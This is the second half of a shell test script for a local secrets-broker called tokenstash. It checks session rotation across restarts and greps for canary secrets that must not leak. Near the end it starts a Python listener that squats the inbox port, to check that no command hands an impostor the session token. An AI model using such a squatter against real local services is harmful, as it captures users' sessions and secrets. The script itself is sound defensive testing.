  for kid in $(keyctl list @u 2>/dev/null | awk -F: '/tokenstash/ { gsub(/ /, "", $1); print $1 }'); do
    if keyctl pipe "$kid" 2>/dev/null | grep -q "LEAKCANARY"; then echo "LEAK: canary in the user kernel keyring (key $kid)"; fail=1; fi
  done
fi

# ── restart: the session is retired, the proof key and card links survive ────────────────
# A link captured before the restart (a notification left in the tray, a chat log) must not
# open the inbox that runs now; the CLI must still recognise that inbox; a card link printed
# before the restart must still open its card.
kill "$INBOX_PID" 2>/dev/null || true
wait "$INBOX_PID" 2>/dev/null || true
OLDTOKEN="$TOKEN"
"$TS" inbox --port "$PORT" --keep >"$OUT/inbox2.txt" 2>&1 &
INBOX_PID=$!
for _ in $(seq 1 30); do curl -fs "http://127.0.0.1:$PORT/verify?c=ready" >/dev/null 2>&1 && break; sleep 0.1; done
TOKEN="$(cat "$TOKEN_FILE")"
[ "$TOKEN" != "$OLDTOKEN" ] || { echo "FAIL: the session did not rotate on restart"; fail=1; }
[ "$(cat "$PROOF_FILE")" = "$PROOF" ] || { echo "FAIL: the proof key changed on restart; the CLI would stop recognising its own inbox"; fail=1; }
[ "$(cat "$CAP_FILE")" = "$CAPKEY" ] || { echo "FAIL: the capability key changed on restart; every card link printed would be dead"; fail=1; }
code=$(curl -s -o "$WEB/stale.html" -w '%{http_code}' -c "$WEB/stale.jar" "http://127.0.0.1:$PORT/?t=$OLDTOKEN")
[ "$code" = 404 ] || { echo "FAIL: a session from before the restart authenticated ($code)"; fail=1; }
grep -q "Send the link to my desktop" "$WEB/stale.html" || { echo "FAIL: the stale link did not say how to recover"; fail=1; }
grep -q "tokenstash_" "$WEB/stale.jar" 2>/dev/null && { echo "FAIL: the stale link set a cookie"; fail=1; }
code=$(curl -s -o "$WEB/stale-cookie.txt" -w '%{http_code}' -b "$JAR" "http://127.0.0.1:$PORT/")
[ "$code" = 404 ] && [ ! -s "$WEB/stale-cookie.txt" ] || { echo "FAIL: a cookie from before the restart opened the index ($code)"; fail=1; }
code=$(curl -s -b "$JAR" -o /dev/null -w '%{http_code}' --data "action=deny&t=$OLDTOKEN" "http://127.0.0.1:$PORT/t/$BTID")
[ "$code" = 404 ] || { echo "FAIL: a stale session closed a card ($code)"; fail=1; }
NONCE2="nonce2-$RANDOM"
[ "$(curl -fsS "http://127.0.0.1:$PORT/verify?c=$NONCE2")" = "$(hmacof "$PROOF" "$VTAG$NONCE2")" ] || { echo "FAIL: /verify changed across the restart"; fail=1; }
grep -q "ownership verified" <("$TS" doctor 2>&1) || { echo "FAIL: the CLI does not recognise the restarted inbox"; fail=1; }
code=$(curl -s -o "$WEB/card-after-restart.html" -w '%{http_code}' -b "$RJAR" "http://127.0.0.1:$PORT/p/$RTID")
[ "$code" = 200 ] && grep -q "OPENAI_API_KEY" "$WEB/card-after-restart.html" || { echo "FAIL: a card link from before the restart no longer opens its card ($code)"; fail=1; }
: >"$JAR"
curl -fsS -c "$JAR" -b "$JAR" -L -o "$WEB/index-after-restart.html" "http://127.0.0.1:$PORT/?t=$TOKEN"
grep -q "tokenstash inbox" "$WEB/index-after-restart.html" || { echo "FAIL: the new session does not open the index"; fail=1; }
# a second inbox that loses the bind must not retire the running one's session
"$TS" inbox --port "$PORT" >"$OUT/inbox-loser.txt" 2>&1 || true
grep -q "already running" "$OUT/inbox-loser.txt" || { echo "FAIL: the losing bind did not say so"; fail=1; }
[ "$(cat "$TOKEN_FILE")" = "$TOKEN" ] || { echo "FAIL: a failed bind rotated the live session"; fail=1; }
code=$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" "http://127.0.0.1:$PORT/")
[ "$code" = 200 ] || { echo "FAIL: the live session died after a losing bind ($code)"; fail=1; }

# ── an unverified listener on the inbox port must never be handed the session ─────────────
# Last, because it takes the inbox down for the rest of the run.
# Ownership is proved with /verify before any surface emits ?t=. When a process squats the
# port, every human-facing surface has to refuse: no session in a URL, no browser opened, no
# notification pointing there. Warning and carrying on would hand the squatter the session
# it needs to impersonate the inbox for the next paste.
kill "$INBOX_PID" 2>/dev/null || true
wait "$INBOX_PID" 2>/dev/null || true
cat > "$WEB/squat.py" <<'PY'
# A plain HTTP listener that answers everything with 200 "hi". It does not know the proof key,
# so it cannot answer /verify — which is exactly what the ownership proof is for.
import socket, sys, time
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('127.0.0.1', int(sys.argv[1])))
s.listen(8)
s.settimeout(0.5)
end = time.time() + 120
while time.time() < end:
    try:
        c, _ = s.accept()
        c.recv(8192)
        c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nhi')
        c.close()
    except Exception:
        pass
PY
python3 "$WEB/squat.py" "$PORT" >/dev/null 2>&1 &
SQUAT_PID=$!   # cleanup() kills it; do not replace the trap, it also forgets the canaries
for _ in $(seq 1 50); do curl -s -o /dev/null --max-time 2 "http://127.0.0.1:$PORT/" && break; sleep 0.1; done
BROWSER=/bin/echo human "$TS" open >"$OUT/squat-open.txt" 2>&1 || true
"$TS" tasks >"$OUT/squat-tasks.txt" 2>&1 || true
"$TS" doctor >"$OUT/squat-doctor.txt" 2>&1 || true
"$TS" need SQUAT_TEST_KEY --agent ci >"$OUT/squat-need.txt" 2>&1 || true
# ...and again on a pty, where the TTY-gated surfaces are in their most permissive mode
if script -qec true /dev/null >/dev/null 2>&1; then
  script -qec "$TS tasks" /dev/null >"$OUT/squat-tasks-pty.txt" 2>&1 || true
  script -qec "$TS doctor" /dev/null >"$OUT/squat-doctor-pty.txt" 2>&1 || true
  BROWSER=/bin/echo script -qec "$TS open" /dev/null >"$OUT/squat-open-pty.txt" 2>&1 || true
fi
for f in "$OUT"/squat-*.txt; do
  if grep -q "$TOKEN\|$OLDTOKEN" "$f"; then echo "LEAK: $(basename "$f") emitted the session while another process held the port"; fail=1; fi
  if grep -qE '\?t=' "$f"; then echo "LEAK: $(basename "$f") emitted a tokened URL for an unverified listener"; fail=1; fi
done
grep -q "held by another process" "$OUT/squat-open.txt" || { echo "FAIL: open did not say why it refused"; fail=1; }
grep -q "http://" "$OUT/squat-open.txt" && { echo "FAIL: open printed a URL for an unverified listener"; fail=1; }
for f in "$OUT"/squat-tasks*.txt "$OUT"/squat-doctor*.txt "$OUT"/squat-need.txt; do
  [ -f "$f" ] || continue
  grep -q "http://127.0.0.1:$PORT" "$f" && { echo "FAIL: $(basename "$f") linked a human to an unverified listener"; fail=1; }
done
kill "$SQUAT_PID" 2>/dev/null || true

if [ $fail -eq 0 ]; then echo "leak test passed"; fi
exit $fail
